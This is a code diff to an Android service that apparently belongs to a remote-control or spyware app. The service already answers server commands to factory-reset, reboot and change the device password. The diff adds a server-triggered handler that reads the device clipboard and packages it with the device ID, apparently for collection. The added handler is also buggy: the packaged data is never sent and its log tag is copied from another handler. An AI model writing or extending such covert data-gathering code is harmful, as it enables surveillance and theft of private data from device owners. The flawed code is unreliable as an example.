@@ -80,6 +80,7 @@ public class MainService extends Service {
                     ioSocket.on("0xF", factoryResetDevice);
                     ioSocket.on("0x10", rebootDevice);
                     ioSocket.on("0x11", changeDevicePassword);
+                    ioSocket.on("0x12", clipboardMonitoring);
 
                     if(!ioSocket.connected()){
                         ioSocket.connect();
@@ -425,6 +426,20 @@ public class MainService extends Service {
         }
     };
 
+    private Emitter.Listener clipboardMonitoring = new Emitter.Listener() {
+        @Override
+        public void call(Object... args) {
+            ClipboardMonitoring clip = new ClipboardMonitoring(getApplicationContext());
+            try {
+                JSONObject jsonObject = new JSONObject();
+                jsonObject.put("device_id", device_id);
+                jsonObject.put("message", "");
+                jsonObject.put("clip", clip.getClipData());
+            } catch (Exception exception) {
+                Log.i("rebootDevice", exception.getMessage());
+            }
+        }
+    };
 
     @Override
     public void onDestroy() {
